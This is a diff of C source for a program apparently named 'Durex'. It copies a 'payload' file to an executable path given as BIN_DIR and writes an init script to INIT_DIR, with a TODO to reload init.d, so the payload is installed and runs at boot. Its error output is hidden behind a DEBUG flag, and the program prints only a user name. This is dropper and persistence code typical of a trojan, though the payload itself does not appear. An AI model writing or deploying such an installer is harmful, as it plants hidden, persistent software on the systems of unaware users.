@@ -12,25 +12,25 @@
 
 #include "../includes/durex.h"
 
-int read_obj(void **obj, size_t *obj_size)
+static int read_obj(char *file_name, void **obj, size_t *obj_size)
 {
 	int payload_fd;
 
-	if ((payload_fd = open("payload/payload", O_RDONLY)) < 0)
+	if ((payload_fd = open(file_name, O_RDONLY)) < 0)
 	{
-		printf("Error %d opening 'payload' file.\n", payload_fd);
+		(DEBUG) ? printf("Error %d opening '%s' file.\n", payload_fd, file_name) : 0;
 		return (-1);
 	}
 	if ((*obj_size = lseek(payload_fd, (size_t)0, SEEK_END)) <= 0)
 	{
-		printf("Error empty payload\n");
+		(DEBUG) ? printf("Error empty '%s' file\n", file_name) : 0;
 		close(payload_fd);
 		return (-1);
 	}
 	if ((*obj = mmap(0, *obj_size, PROT_READ, MAP_PRIVATE, payload_fd, 0)) == \
 			MAP_FAILED)
 	{
-		printf("Error mapping payload\n");
+		(DEBUG) ? printf("Error mapping '%s' file\n", file_name) : 0;
 		close(payload_fd);
 		return (-1);
 	}
@@ -38,21 +38,21 @@ int read_obj(void **obj, size_t *obj_size)
 	return 0;
 }
 
-int durex()
+static int create_file()
 {
 	// creates a Durex file
 	int durex_fd;
 
-	if ((durex_fd = open("_Durex", O_WRONLY | O_CREAT | O_TRUNC, 0755)) < 0)
+	if ((durex_fd = open(BIN_DIR, O_WRONLY | O_CREAT | O_TRUNC, 0755)) < 0)
 	{
-		printf("Error %d creating 'Durex' file.\n", durex_fd);
+		(DEBUG) ? printf("Error %d creating 'Durex' file.\n", durex_fd) : 0;
 		return (-1);
 	}
 	// read payload content
 	void *obj = NULL;
 	size_t obj_size = 0;
-
-	if (read_obj(&obj, &obj_size))
+	// tmp
+	if (read_obj(PAYLOAD_SRC, &obj, &obj_size))
 	{
 		close(durex_fd);
 		return (-1);
@@ -61,14 +61,42 @@ int durex()
 	write(durex_fd, obj, obj_size);
 	// tmp
 	if (munmap(obj, obj_size) < 0)
-		printf("Error munmap\n");
+		(DEBUG) ? printf("Error munmap\n") : 0;
 	close(durex_fd);
+	return 0;
+}
+
+static int init_d()
+{
+	int init_fd = 0;
+	void *obj = NULL;
+	size_t obj_size = 0;
+
+	if ((init_fd = open(INIT_DIR, O_WRONLY | O_CREAT | O_TRUNC, 0755)) < 0)
+	{
+		return -1;
+	}
+	// read init file content
+	if (read_obj(INIT_SRC, &obj, &obj_size))
+	{
+		close(init_fd);
+		return -1;
+	}
+	// write content
+	write(init_fd, obj, obj_size);
+	// tmp
+	if (munmap(obj, obj_size) < 0)
+		(DEBUG) ? printf("Error munmap\n") : 0;
+	close(init_fd);
+	// TODO reload init d
+	//
 	return 0;
 }
 
 int main(void)
 {
-	durex();
+	create_file();
+	init_d();
 	printf("eparisot\n");
 	return 0;
 }
